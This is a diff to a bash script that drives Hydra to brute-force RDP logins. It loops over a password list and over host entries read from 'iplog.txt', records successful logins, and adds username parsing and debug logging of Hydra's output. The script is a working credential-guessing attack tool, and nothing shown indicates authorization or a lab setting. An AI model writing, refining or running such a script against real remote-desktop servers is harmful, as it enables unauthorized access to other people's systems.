@@ -13,6 +13,7 @@ fi
 
 # Create or clear the success log file
 > "$success_log_file"
+> "hydra_debug.log"  # Clear debug log
 
 # Read all RDP entries into an array
 mapfile -t iplog_entries < "$iplog_file"
@@ -51,15 +52,19 @@ for password in "${passwords[@]}"; do
 
     # Loop through each RDP entry in iplog.txt
     for entry in "${iplog_entries[@]}"; do
-        # Use the entry directly without modification
         if [[ -z "$entry" ]]; then
             echo "Invalid entry in iplog: '$entry', skipping..."
             continue
         fi
-        
+
+        username=$(echo "$entry" | cut -d':' -f2 | cut -d'@' -f1) # Adjust as per your entry format
+
         # Run Hydra for each username and password pair, capturing output
-        if sudo hydra -l "${entry#rdp://*}" -p "$password" "$entry" rdp -t 1 -W 3 | grep -q "login successful"; then
-            echo "Successful login with ${entry#rdp://*} on $entry using password: $password" >> "$success_log_file"
+        hydra_output=$(sudo hydra -l "$username" -p "$password" "$entry" rdp -t 1 -W 5)
+        echo "$hydra_output" >> hydra_debug.log
+
+        if echo "$hydra_output" | grep -q "login successful"; then
+            echo "Successful login with $username on $entry using password: $password" >> "$success_log_file"
             successful_attempts=$((successful_attempts + 1))
         fi
 
@@ -67,8 +72,8 @@ for password in "${passwords[@]}"; do
         current_attempt=$((current_attempt + 1))
         
         # Introduce a delay based on the observed response time
-        sleep 3  # Adjusted to 3 seconds to match server response time
-        
+        sleep 3  # Keep it at 3 seconds
+
         # Update elapsed time and display progress
         elapsed_time=$(( $(date +%s) - start_time ))
         display_progress "$elapsed_time" "$current_attempt" "$total_attempts" "$successful_attempts"
